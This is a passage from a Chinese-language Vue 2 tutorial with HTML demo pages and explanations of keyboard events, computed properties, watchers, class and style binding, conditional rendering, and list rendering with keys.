					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

###  7.3 键盘事件

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中常用的按键别名：
							回车 => enter
							删除 => delete (捕获“删除”和“退格”键)
							退出 => esc
							空格 => space
							换行 => tab (特殊，必须配合keydown去使用)
							上 => up
							下 => down
							左 => left
							右 => right

				2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

				3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
							(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
							(2).配合keydown使用：正常触发事件。

				4.也可以使用keyCode去指定具体的按键（不推荐）

				5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```

### 7.4 事件总结

Vue可以监听并响应用户的输入或其他 DOM 事件。Vue 提供一个使用 v-on 指令或其简写 @ 来监听 DOM 事件并在触发时执行 JavaScript 代码的简洁方式。Vue 的事件处理机制提供了灵活而强大的方式来响应用户操作，使得开发交云动的界面变得简单高效

1.监听事件：可以使用 `v-on` 指令来监听一个元素上的事件。例如，监听按钮点击事件

```html
<button v-on:click="handleClick">点击我</button>
<!-- 或者使用简写形式  -->
<button @click="handleClick">点击我</button>
```

2.方法事件处理器：在 Vue 实例的 `methods` 对象中定义方法来处理事件。这个方法将在事件被触发时调用

```javascript
new Vue({
  el: '#app',
  methods: {
    handleClick() {
      alert('按钮被点击了!');
    }
  }
});
```

3.事件传参：在某些情况下可能要向事件处理函数传递参数。可以直接在模板中传递参数

```html
<button @click="handleClick('hello')">点击我</button>
// 在方法中接收这个参数
methods: {
  handleClick(message) {
    alert(message);
  }
}
```

4.访问原生事件对象：如果需要访问原生 DOM 事件对象，可以使用特殊的 `$event` 变量

```html
<button @click="handleClick($event, 'hello')">点击我</button>
// 这样，方法就可以接收事件对象作为参数
methods: {
  handleClick(event, message) {
    console.log(event); // 原生 DOM 事件
    alert(message);
  }
}
```

5.事件修饰符：Vue 提供了事件修饰符来执行一些常见的 DOM 事件处理模式，如 `.stop` 阻止事件冒泡、`.prevent` 阻止默认事件等。这些修饰符可以链接起来使用

```html
<!-- 阻止点击事件冒泡 -->
<button @click.stop="handleClick">点击我</button>

<!-- 提交事件不再重载页面 -->
<form @submit.prevent="handleSubmit">...</form>

<!-- 修饰符可以链式使用 -->
<button @click.stop.prevent="handleClick">点击我</button>
```

6.键盘事件：监听键盘事件时可能只想响应特定键的操作。Vue 允许添加按键修饰符来处理这种情况

```html
<!-- 只有在按下 Enter 键时调用 `submit` 方法 -->
<input @keyup.enter="submit">
```

## 8. 计算属性与监视

###  8.1  计算属性

![image-20240331170359835](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122356954.png)

```
计算属性computed:
1.要显示的数据不存在，要通过计算得来
2.在computed对象中定义计算属性
3.在页面中使用{方法名}}来显示计算的结果
```

姓名案例实现一：插值语法实现

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_插值语法实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{firstName}}-{{lastName}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			}
		})
	</script>
</html>
```

姓名案例实现二：methods实现

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_methods实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName()}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				fullName(){
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
	</script>
</html>
```

姓名案例实现三：计算属性实现

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			计算属性：
					1.定义：要用的属性不存在，要通过已有属性计算得来。
					2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
					3.get函数什么时候执行？
								(1).初次读取时会执行一次。
								(2).当依赖的数据发生改变时会被再次调用。
					4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
					5.备注：
							1.计算属性最终会出现在vm上，直接读取使用即可。
							2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			methods: {
				demo(){
					
				}
			},
			computed:{
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
			}
		})
	</script>
</html>
```

姓名案例实现四：计算属性简写

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
			},
			computed:{
				//完整写法
				/* fullName:{
					get(){
						console.log('get被调用了')
						return this.firstName + '-' + this.lastName
					},
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				} */
				//简写
				fullName(){
					console.log('get被调用了')
					return this.firstName + '-' + this.lastName
				}
			}
		})
	</script>
</html>
```

**计算属性总结**：在Vue.js中，计算属性（Computed Properties）是一种非常有用的功能，它们主要用于声明式地描述数据依赖关系。当需要进行数据转换或计算时，计算属性可以简化模板和逻辑代码，使得代码更加简洁和易于维护。计算属性强化了 Vue.js 的声明式编程模型，让开发者能够以更简洁、更高效的方式处理复杂逻辑和数据依赖，是Vue框架中不可或缺的一部分。计算属性具有以下特点：

- **响应式依赖**：计算属性基于它们的响应式依赖进行缓存。只有当依赖项发生变化时，计算属性才会重新计算。这意味着只要依赖项保持不变，多次访问计算属性会立即返回之前的计算结果，而不需要再次执行计算
- **声明式逻辑**：通过计算属性，可以将任何复杂逻辑声明为一个属性，Vue 会自动将这个属性和响应式数据关联起来。这样就可以在模板中像访问普通属性那样访问计算属性，Vue 会确保属性的值始终保持最新
- **计算属性 vs 方法**：为什么不直接在模板中调用方法来处理数据呢？主要区别在于计算属性是基于响应式依赖进行缓存的。如果计算属性的依赖项没有改变，访问计算属性多次，它将立即返回缓存的结果，而不是重新执行函数。相比之下，每次调用方法时，无论依赖项是否改变，方法总会重新执行
- **计算属性的 getter 和 setter**：计算属性默认只有 getter 函数，但你也可以提供一个 setter 函数，当你尝试设置计算属性的值时，setter 函数会被调用。这对于当计算属性的值依赖于多个数据源或你需要执行额外的逻辑来更新依赖项时特别有用

```java
// 在这个例子中，reversedMessage 是一个计算属性，它依赖于 message 数据
// 只要 message 发生变化，reversedMessage 就会重新计算
// 在模板中可以像访问 data 中的 message 一样访问 reversedMessage，Vue 将自动确保它的值是最新的
var vm = new Vue({
  el: '#example',
  data: {
    message: 'Hello'
  },
  computed: {
    // 计算属性的 getter
    reversedMessage: function () {
      // `this` 指向 vm 实例
      return this.message.split('').reverse().join('')
    }
  }
})
```

###  8.2  监视属性

```
监视属性:
        1.通过vm对象的$watch()或 watch配置来监视指定的属性
        2.当属性变化时,回调函数自动调用,在函数内部进行计算
```

利用计算属性实现：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
			<!-- <button @click="isHot = !isHot">切换天气</button> -->
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
		})
	</script>
</html>
```

 监视属性：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				监视属性watch：
					1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
					2.监视的属性必须存在，才能进行监视！！
					3.监视的两种写法：
							(1).new Vue时传入watch配置
							(2).通过vm.$watch监视
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			// 监视属性写法一：
			/* watch:{
				isHot:{
					immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}
			} */
		})

		// 监视属性写法二：
		vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			//handler什么时候调用？当isHot发生改变时。
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		})
	</script>
</html>
```

深度监视：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_深度监视</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				深度监视：
						(1).Vue中的watch默认不监测对象内部值的改变（一层）。
						(2).配置deep:true可以监测对象内部值改变（多层）。
				备注：
						(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
						(2).使用watch时根据数据的具体结构，决定是否采用深度监视。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>

			<!-- 实现方法一：创建一个新的numbers对象替换旧的，然后彻底替换掉numbers，就可以实现对number的监控 -->
			<!-- 较麻烦，此处不采用 -->
			<!-- <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button> -->
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				//监视多级结构中某个属性的变化
				/* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})

	</script>
</html>
```

监视属性简写：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性_简写</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				//正常写法
				/* isHot:{
					// immediate:true, //初始化时让handler调用一下
					// deep:true,//深度监视
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}, */
				//简写（不需要immediate和deep时可以简写）
				/* isHot(newValue,oldValue){
					console.log('isHot被修改了',newValue,oldValue,this)
				} */
			}
		})

		//正常写法
		/* vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			deep:true,//深度监视
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		}) */

		//简写（不需要immediate和deep时可以简写）
		/* vm.$watch('isHot',(newValue,oldValue)=>{
			console.log('isHot被修改了',newValue,oldValue,this)
		}) */

	</script>
</html>
```

**监视属性总结**：监视属性（watchers）是 Vue 组件中的一个功能，可以对某些数据进行观察，并在这些数据发生变化时执行特定操作。监视属性非常适合执行异步操作或开销较大的操作响应数据的变化。监视属性提供了一种方式去响应数据的变化，执行一些逻辑，比如从服务器获取数据、验证或者过滤。监视属性定义在 Vue 组件的 watch 选项内。它是一个对象，其中的键是需要观察的数据名称，这个名称对应组件的 data 或 props 中的属性，而值是当这些数据发生变化时调用的函数

```javascript
const app = new Vue({
  el: '#app',
  data: {
    message: 'Hello Vue!'
  },
  watch: {
    // 每当 message 属性变化时，这个函数就会被执行
    message(newVal, oldVal) {
      console.log(`message changed from ${oldVal} to ${newVal}`);
    }
  }
});
```

**监视属性的高级用法**：Vue 提供了一些高级选项来使监视器更加强大和灵活，例如深度监视 和 立即执行

- 深度监视（Deep Watching）：Vue 默认监视器只能检测对象属性的一层变化。要想深度监视一个对象内部属性的变化，可以使用 deep 选项

```javascript
watch: {
  someObject: {
    handler(newVal, oldVal) {
      // 当 someObject 或其内部属性变化时执行
    },
    deep: true
  }
}
```

- 立即执行（Immediate）：有时候希望在页面加载时立即执行监视器的回调函数，可以使用 immediate 选项

```javascript
watch: {
  someData: {
    handler(newVal, oldVal) {
      // do something
    },
    immediate: true
  }
}
```

**监视属性与计算属性（Computed Properties）的对比**：监视属性和计算属性都可以用来依据组件的状态进行动态计算。选择使用哪一种，主要取决于具体情况。**计算属性**：适合用在任何复杂逻辑中，对数据进行加工后输出。它们是基于它们的依赖缓存的，只有在相关依赖发生改变时才会重新计算。使用计算属性可以保证不用在每次获取属性时都执行复杂的逻辑。**监视属性**：适合执行异步操作或开销较大的操作，响应数据的变化

###  8.3  对比：计算属性 VS 监视属性

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_watch实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				computed和watch之间的区别：
						1.computed能完成的功能，watch都可以完成。
						2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
				两个重要的小原则：
							1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
							2.所有不被Vue所管理的函数（如定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
								这样this的指向才是vm 或 组件实例对象。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				fullName:'张-三'
			},
			watch:{
				firstName(val){
					// watch可以进行异步操作
					// firstName发生变化1秒后，fullName才变化
					setTimeout(()=>{
						console.log(this)
						this.fullName = val + '-' + this.lastName
					},1000);
				},
				lastName(val){
					this.fullName = this.firstName + '-' + val
				}
			}
		})
	</script>
</html>
```

## 9. `class`样式绑定 与 `style`样式绑定

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			绑定样式：
					1. class样式
								写法:class="xxx" xxx可以是字符串、对象、数组。
										字符串写法适用于：类名不确定，要动态获取。
										对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
										数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
					2. style样式
								:style="{fontSize: xxx}"其中xxx是动态值。
								:style="[a,b]"其中a、b是样式对象。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				},
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
	</script>
</html>
```

在Vue中，绑定`class`样式和`style`样式是一种动态地给元素添加样式的方法，可以根据数据的变化来调整元素的样式

**一、绑定Class样式**：Vue 提供了几种方式来绑定`class`，以便根据数据的变化动态添加或删除类

- 对象语法：你可以传递一个对象给`:class`（或`v-bind:class`），以动态地切换类

```html
<!-- 如果isActive的值为true，那么这个div将会被添加active类 -->
<!-- 如果isActive的值为false，那么active类将被移除 -->
<div v-bind:class="{ active: isActive }"></div>
```

- **数组语法**：你也可以将一个数组传递给`:class`，以应用一个类列表

```html
<!-- activeClass和errorClass都是数据属性，它们的值将被添加到div的类列表中 -->
<div v-bind:class="[activeClass, errorClass]"></div>
```

**二、绑定Style样式**：Vue也可以动态地绑定内联样式，通过：`style`（或`v-bind:style`）属性来实现

- **对象语法**：使用对象语法时，CSS属性名可以用驼峰式（camelCase）或短横线分隔（kebab-case，需要使用引号）

```html
<!-- activeColor和fontSize是数据属性，它们的值将被设置到div的style属性中 -->
<div v-bind:style="{ color: activeColor, fontSize: fontSize + 'px' }"></div>
```

- **数组语法**：可以将一个样式对象的数组传递给`:style`，以应用多个样式对象

```html
<!-- baseStyles和overridingStyles都是数据属性，它们指向样式对象 -->
<!-- 这两个对象中的样式将被应用到div上，后面的样式优先级更高 -->
<div v-bind:style="[baseStyles, overridingStyles]"></div>
```

##  10.  条件渲染

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				条件渲染：
							1.v-if
										写法：
												(1).v-if="表达式" 
												(2).v-else-if="表达式"
												(3).v-else="表达式"
										适用于：切换频率较低的场景。
										特点：不展示的DOM元素直接被移除。
										注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

							2.v-show
										写法：v-show="表达式"
										适用于：切换频率较高的场景。
										特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
								
							3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```

在Vue.js中，条件渲染是一种根据数据的不同值动态地渲染元素或组件的方式。Vue 提供了几个核心的指令来处理条件渲染，主要的有：`v-if`、`v-else-if`、`v-else` 和 `v-show`

**v-if**：`v-if` 指令用来根据表达式的真假值条件性地渲染一个元素。在切换时，元素及其数据绑定 / 组件被销毁并重建

```html
<!-- 如果visible的值是true，那么div元素将会被渲染 -->
<!-- 如果visible的值是false，那么div元素将不会出现在DOM中 -->
<div v-if="visible">看到我了吗？</div>
```

**v-else**：`v-else` 指令必须紧跟在 `v-if` 或 `v-else-if` 后面，用以表示 `v-if` 表达式为假时应该渲染的内容

```html
<!-- 如果type的值不是'A'，那么将渲染第二个div元素中 -->
<div v-if="type === 'A'">A 类型</div>
<div v-else>B 类型</div>
```

**v-else-if**：`v-else-if`，顾名思义，充当 `v-if` 的“else if 块”，必须紧跟在 `v-if` 或 `v-else-if` 元素之后

```html
<div v-if="type === 'A'">A 类型</div>
<div v-else-if="type === 'B'">B 类型</div>
<div v-else>C 类型</div>
```

**v-show**：`v-show` 指令则是另一个根据布尔值条件展示元素的选项。不同于 `v-if`，使用 `v-show` 的元素始终会被渲染和保留在 DOM 中，只是简单地切换其 CSS 的 `display` 属性

```html
<!-- 如果 visible是 false，那么这个 div仍然存在于DOM中，但是是不可见的 -->
<div v-show="visible">你能看到我吗？</div>
```

**对比 v-if vs v-show**：

- **v-if** 是“真正”的条件渲染，因为它确保在条件不满足时连带的事件监听器和子组件都会被销毁和重构
- **v-show** 简单地切换元素的 `display` 样式属性。如果需要非常频繁地切换，`v-show` 会更加合适

选择使用 `v-if` 还是 `v-show`，主要依据：是否需要频繁地切换显示状态，以及初始渲染条件是否大多数时间为 false

##  11.  列表渲染

### 11.1  基本使用

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				v-for指令:
						1.用于展示列表数据
						2.语法：v-for="(item, index) in xxx" :key="yyy"
						3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
</html>
```

###  11.2  key作用与原理

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>key的原理</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				面试题：react、vue中的key有什么作用？（key的内部原理）
						
						1. 虚拟DOM中key的作用：
										key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
										随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
										
						2.对比规则：
									(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
												①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
												②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

									(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
												创建新的真实DOM，随后渲染到到页面。
												
						3. 用index作为key可能会引发的问题：
											1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
															会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

											2. 如果结构中还包含输入类的DOM：
															会产生错误DOM更新 ==> 界面有问题。

						4. 开发中如何选择key?:
											1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
											2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
												使用index作为key是没有问题的。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<button @click.once="add">添加一个老刘</button>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老刘',age:40}
						this.persons.unshift(p)
					}
				},
			})
		</script>
</html>
```



![image-20240403002113502](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122357022.png)



![image-20240403002505953](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122357081.png)

###  11.3  列表过滤

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
